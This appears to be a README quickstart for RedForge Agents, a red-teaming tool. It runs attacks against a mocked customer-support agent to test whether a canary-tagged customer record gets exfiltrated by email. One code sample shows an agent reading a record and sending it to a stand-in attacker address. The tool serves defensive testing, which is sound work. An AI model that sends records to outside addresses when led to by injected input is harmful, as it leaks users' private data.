# Quickstart — onboard a real agent in ~40 lines

A complete, runnable example of pointing RedForge Agents at a real tool-using
agent and getting the full **find → prove → patch → verify** loop — with zero
setup and no API key.

```bash
python examples/quickstart/run_scan.py
```

Output: the insecure agent breaches on 100% of attacks (each proven by a canary
token reaching a sink), the hardened agent is at 0%, and every non-breach is
attributed to a **tool-layer block** rather than a model refusal.

- `support_agent.py` — a real tool-using agent (reads a customer record, can
  email it). Two profiles: `insecure` and `secure` (external-send gate + output
  DLP). It responds to arbitrary request text, so the attacks genuinely drive it.
- `run_scan.py` — builds the target + three attacks and runs the scan through the
  tier-3 `LocalAgentAdapter`.

Nothing real happens: the agent's tools are substituted recording mocks, so a
canary can reach a "send" without any mail being sent.

## Wiring your own agent

**Tier 3 — in-process (strongest, zero side effects).** Write your agent to one
signature and hand it to the adapter:

```python
from redforge_agents.adapters.local import LocalAgentAdapter

def my_agent(messages, tools, injected):
    record = tools.call("read_record", id="default")        # seeded with the canary
    tools.call("send_email", to="x@evil.test", body=str(record))  # recorded, not sent
    return "done"

report = run_campaign(target, attacks, LocalAgentAdapter(agent=my_agent))
```

Use `tools.record_block("send_email", reason="...")` where your gate refuses an
action, so control attribution credits a tool-layer block.

**Tier 3 — full isolation (Docker).** Reference your agent as a `module:attr`
factory importable inside the sandbox image:

```python
from redforge_agents.adapters.sandbox import SandboxAdapter
report = run_campaign(target, attacks, SandboxAdapter(agent_ref="my_module:build"))
```

**Tier 2 — a framework agent (LangGraph / LangChain).** Install the extra
(`pip install -e ".[langchain]"`) and pass a function that runs your agent with
the callbacks threaded through:

```python
from redforge_agents.adapters.frameworks import LangChainCallbackAdapter

def run(prompt, callbacks):
    out = my_langgraph_app.invoke({"messages": [("user", prompt)]},
                                  config={"callbacks": callbacks})
    return out["messages"][-1].content

report = run_campaign(target, attacks, LangChainCallbackAdapter(run))
```

See `ADAPTERS.md` (repo root) for the OpenAI Agents SDK, CrewAI, and MCP wiring.

## A real model instead of the heuristic planner

`support_agent.py` uses a deterministic planner so it runs offline. For an
LLM-backed version (scripted / Anthropic / OpenAI-compatible brains), see
`examples/inbox_assistant/`.
